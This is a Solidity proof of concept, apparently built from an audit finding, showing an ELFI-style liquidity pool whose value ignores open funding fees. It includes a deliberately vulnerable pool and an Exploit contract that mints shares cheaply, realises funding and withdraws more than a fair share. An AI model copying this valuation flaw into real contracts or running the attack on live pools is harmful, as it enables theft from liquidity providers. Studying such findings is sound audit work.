// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ELFI LpPoolQueryProcess.getPoolIntValue — pool value ignores open funding
    (Sherlock H-3, finding 34765). SYNTHETIC, cheatcode-free.
    Root cause: value is amount + unsettledAmount + unPnl. Funding that is
    already owed to the pool is not in that sum until a position update
    writes it into unsettledAmount. Shares are minted on the low value.
    After the update the same shares redeem against the spiked value. */

contract Asset {
    string public name = "ELFI base";
    string public symbol = "BASE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LpPool {
    uint256 internal constant WAD = 1e18;

    Asset public asset;
    int256 public amount;
    int256 public unsettledAmount;
    int256 public openFundingFee;
    int256 public marketUnPnl;
    uint256 public totalSupply;
    mapping(address => uint256) public sharesOf;
    uint256 public lastMinted;
    uint256 public lastWithdrawn;

    constructor(address _asset, address lp, uint256 baseAmount, uint256 funding) {
        asset = Asset(_asset);
        amount = int256(baseAmount);
        openFundingFee = int256(funding);
        totalSupply = baseAmount;
        sharesOf[lp] = baseAmount;
    }

    function getMarketUnPnl() public view returns (int256) {
        return marketUnPnl;
    }

    function oraclePrice() public pure returns (int256) {
        return int256(WAD);
    }

    function tokenToUsdInt(int256 tokenAmount, uint256, int256 price) public pure returns (int256) {
        return tokenAmount * price / int256(WAD);
    }

    function getPoolIntValue() public view virtual returns (int256 value) {
        if (amount > 0 || unsettledAmount > 0) {
            int256 unPnl = getMarketUnPnl();
            int256 baseTokenPrice = oraclePrice();
            // @> VULN: openFundingFee is not in the sum, so the share price is 1e18 instead of 2e18
            value = tokenToUsdInt((amount + unsettledAmount + unPnl), 18, baseTokenPrice);
            // FIX: value = tokenToUsdInt(amount + unsettledAmount + unPnl + openFundingFee, 18, baseTokenPrice);
        }
    }

    function sharePrice() public view returns (uint256) {
        return uint256(getPoolIntValue()) * WAD / totalSupply;
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        int256 poolValue = getPoolIntValue();
        shares = assets * totalSupply / uint256(poolValue);
        lastMinted = shares;
        asset.transferFrom(msg.sender, address(this), assets);
        amount += int256(assets);
        totalSupply += shares;
        sharesOf[msg.sender] += shares;
    }

    function realizeFunding() external {
        int256 fee = openFundingFee;
        openFundingFee = 0;
        unsettledAmount += fee;
        asset.mint(address(this), uint256(fee));
    }

    function withdraw(uint256 shares) external returns (uint256 assets) {
        int256 poolValue = getPoolIntValue();
        assets = shares * uint256(poolValue) / totalSupply;
        lastWithdrawn = assets;
        sharesOf[msg.sender] -= shares;
        totalSupply -= shares;
        int256 remaining = amount + unsettledAmount - int256(assets);
        if (remaining >= amount) {
            unsettledAmount = remaining - amount;
        } else {
            amount = remaining;
            unsettledAmount = 0;
        }
        asset.transfer(msg.sender, assets);
    }
}

contract Exploit {
    uint256 public constant BASE = 1000e18;
    uint256 public constant FUNDING = 1000e18;
    uint256 public constant DEPOSIT = 1000e18;

    Asset public asset; // nonce 1
    LpPool public pool; // nonce 2
    address public lp; // nonce 3, holds the existing shares

    uint256 public quotedPrice;
    uint256 public fairPrice;
    uint256 public sharesMinted;
    uint256 public fairShares;
    uint256 public withdrawn;
    uint256 public fairWithdraw;

    constructor() {
        asset = new Asset();
        lp = address(new ExistingLp());
        pool = new LpPool(address(asset), lp, BASE, FUNDING);
        asset.mint(address(pool), BASE);
        asset.mint(address(this), DEPOSIT);
    }

    function run() external {
        quotedPrice = pool.sharePrice();
        fairPrice = (BASE + FUNDING) * 1e18 / BASE;
        require(quotedPrice == 1e18, "quoted price");
        require(fairPrice == 2e18, "fair price");

        asset.approve(address(pool), DEPOSIT);
        sharesMinted = pool.deposit(DEPOSIT);
        fairShares = DEPOSIT * BASE / (BASE + FUNDING);
        require(sharesMinted == DEPOSIT, "minted on the low price");
        require(fairShares == DEPOSIT / 2, "fair mint is half");

        pool.realizeFunding();
        withdrawn = pool.withdraw(sharesMinted);
        fairWithdraw = fairShares * (BASE + DEPOSIT + FUNDING) / (BASE + fairShares);
        require(withdrawn == 1500e18, "withdrawal too high");
        require(fairWithdraw == 1000e18, "fair withdrawal");
        require(withdrawn > fairWithdraw, "no excess");
    }
}

contract ExistingLp {}
